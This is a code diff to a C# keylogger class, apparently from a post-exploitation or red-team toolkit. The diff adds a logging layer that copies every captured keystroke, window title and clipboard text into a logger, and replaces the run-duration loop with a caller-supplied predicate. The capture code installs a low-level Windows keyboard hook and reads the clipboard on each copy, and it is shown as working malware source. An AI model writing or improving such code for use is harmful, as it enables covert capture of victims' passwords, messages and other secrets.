@@ -7,11 +7,15 @@
     using System.Text;
     using System.Threading;
     using System.Windows.Forms;
+    using WireTap.Logging;
 
     public class Keyboard
     {
+        private readonly ILogger _logger;
+
         public Keyboard(string logFilename = default)
         {
+            _logger = LogManager.GetLogger<Keyboard>();
             //Logname = logFilename ?? Helpers.CreateTempFileName(".log", "keylogger-", "keylogger");
             Logname = Helpers.CreateTempFileName(".log", "keylogger-", "keylogger");
         }
@@ -1778,16 +1782,22 @@
                         Trace.WriteLine("");
                         Trace.WriteLine(titleString);
                         Trace.WriteLine("");
+                        _logger.LogInformation("");
+                        _logger.LogInformation("");
+                        _logger.LogInformation(titleString);
+                        _logger.LogInformation("");
                         // Write to file
                         LastTitle = props["Window"];
                     }
                     Trace.Write(props["Key"]);
+                    _logger.LogInformation(props["Key"]);
                 }
             }
             catch (Exception ex)
             {
                 Console.WriteLine("[X] Error in CallbackFunction: {0}", ex.Message);
                 Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
+                _logger.LogError(ex);
             }
             return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
@@ -1863,6 +1873,8 @@
 
                 protected override void WndProc(ref Message m)
                 {
+                    var logger = LogManager.GetLogger<NotificationForm>();
+
                     try
                     {
                         //Listen for operating system messages
@@ -1880,10 +1892,12 @@
                                 try
                                 {
                                     Trace.WriteLine($"\tClipboard Copied:\n\t----- START -----\n{Clipboard.GetText()}\n\t----- END -----");
+                                    logger.LogInformation($"\tClipboard Copied:\n\t----- START -----\n{Clipboard.GetText()}\n\t----- END -----");
                                 }
                                 catch (Exception ex)
                                 {
                                     Trace.WriteLine($"\t[Error] Couldn't get text from clipboard. {ex.Message}");
+                                    logger.LogError(ex);
                                 }
                             }
                         }
@@ -1894,14 +1908,17 @@
                     {
                         Console.WriteLine("[X] Error in WndProc: {0}", ex.Message);
                         Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
+                        logger.LogError(ex);
                     }
                 }
             }
         }
 
-        public void StartKeylogger(TimeSpan duration = default)
+        public void StartKeylogger(Func<bool> predicate)
         {
             Console.WriteLine("Starting keylogger...");
+            _logger.LogInformation("Starting keylogger...");
+
             try
             {
                 Trace.Listeners.Clear();
@@ -1928,23 +1945,10 @@
                         var moduleHandle = GetModuleHandle(module);
                         var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
 
-                        if (duration != default)
+                        while (predicate.Invoke())
                         {
-                            var expiration = DateTime.Now.Add(duration);
-
-                            while (DateTime.Now < expiration)
-                            {
-                                PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
-                                Thread.Sleep(5);
-                            }
-                        }
-                        else
-                        {
-                            while (true)
-                            {
-                                PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
-                                Thread.Sleep(5);
-                            }
+                            PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
+                            Thread.Sleep(5);
                         }
 
                         Trace.Listeners.Remove(twtl);
@@ -1957,6 +1961,8 @@
                 Console.WriteLine("[X] Exception: {0}", ex.Message);
                 Console.WriteLine("[X] Stack Trace: {0}", ex.StackTrace);
                 Console.WriteLine("\n[*] Log name for last session: {0}", Logname);
+                _logger.LogError(ex);
+                _logger.LogInformation("\n[*] Log name for last session: {0}", Logname);
             }
         }
     }
